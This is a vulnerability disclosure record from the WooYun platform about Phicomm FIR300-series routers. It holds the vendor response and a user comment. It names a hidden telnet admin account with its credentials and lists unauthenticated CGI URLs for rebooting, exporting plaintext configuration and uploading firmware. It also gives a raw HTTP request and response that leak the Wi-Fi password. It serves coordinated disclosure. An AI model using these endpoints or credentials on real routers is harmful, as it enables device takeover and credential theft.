{"id": 24424, "wybug_id": "wooyun-2015-0122367", "wybug_title": "斐讯路由器漏洞集合（内置账号及隐藏接口）", "wybug_corp": "斐讯", "wybug_author": "路人甲", "wybug_date": "2015-06-24 08:15", "wybug_open_date": "2015-09-26 07:12", "wybug_type": "非授权访问", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["未授权访问"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向公众公开  简要描述： 上海斐讯数据通信技术有限公司（以下简称\"PHICOMM斐讯\"）成立于2009年，其全球总部位于中国-上海，是一家致力于向用户及客户提供移动终端、数据通信产品、云计算等各种软硬件及整体解决方案的研发型高新技术企业，集研发、制造、销售于一体，用户范围涵盖个人消费者、企业、政府、各行业等不同层次。 PHICOMM 斐讯秉承“致力于更自由的沟通”这一使命，构建起了\"快速响应、高性价比\"的公司整体核心竞争力，使公司成立6年间以每年超过200%的增速快速发展，至2014年公司年销售额达100亿人民币，跻身中国电子信息百强。斐讯某几款路由器存在同样的安全漏洞。 详细说明：  6.18乘着京东搞活动入手一个斐讯的路由器，型号为FIR300C，价格不贵功能还不少，到手第一件事就是上网下载新固件更新，官网上的最新固件版本为SW_FIR300C_703003757_V4.0.2.2，放出时间为2015-02-16，如图：\n\n更新完固件忍不住好奇对该路由器进行一番摸索，扫描发现该路由器的lan口开放23及80端口，但wan口没有扫到对应开放的端口，捣鼓一阵后发现存在如下安全漏洞：1.内置隐藏管理员账号可用于telnet登录，用户名support，密码support，telnet服务默认开放而且无法关闭（也可能我没找到关闭的设置处），如图：\n\n2.CGI-BIN目录没有设置访问权限，导致攻击者不用登录即可随意访问，影响如下：http://IP/cgi-bin/reboot.sh   重启路由器http://IP/cgi-bin/ExportSettings.sh  导出路由器配置，导出的配置文件中用户名及密码为明文存放，还有其它的重要信息也一并暴露，如图：\n\nhttp://IP/cgi-bin/upload.cgi  可上传固件文件进行更新http://IP/cgi-bin/upload_bootloader.cgi  可上传boot文件进行更新http://IP/cgi-bin/upload_settings.cgi  可上传配置文件更改路由器配置3.同样为权限设置问题，攻击者可以不需要合法身份即可直接访问内置页面，如提交下面的数据POST http://*.*.*.*/goform/wirelessGetSecurity HTTP/1.1Accept: */*Referer: http://*.*.*.*/status.aspAccept-Language: zh-cnAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)DNT: 1Host: *.*.*.*Content-Length: 3Connection: Keep-AlivePragma: no-cachen/a上面n/a为post提交的数据内容，发送完即可收到路由器响应送回的无线路由配置信息HTTP/1.1 200 OKContent-type: text/plainPragma: no-cacheCache-Control: no-cache0此处为明文SSID0WPA2PSKAES21111此处为明文PSKTIME360010001812ralink0路由器的无线配置就可轻松得到。虽然该路由器没有在wan口上开放23及80端口，但是不代表只有内网用户才能入侵该路由，结合前期出现的路由器入侵方法，在网页上设置恶意脚本是完全可以做到的。同时对该厂家的其它型号路由器进行对比分析，发现FIR300C和FIR300M及FIR300M(plus)同属一个固件系列，存在同样的安全漏洞。   漏洞证明：  \n\n   修复方案：  增加权限判断。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-06-28 07:10 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-24 15:00 |    \t\taygj1412 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 只有神知道的世界)\t\t \n  必须在获取到无线密码的情况下才能利用漏洞吗？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}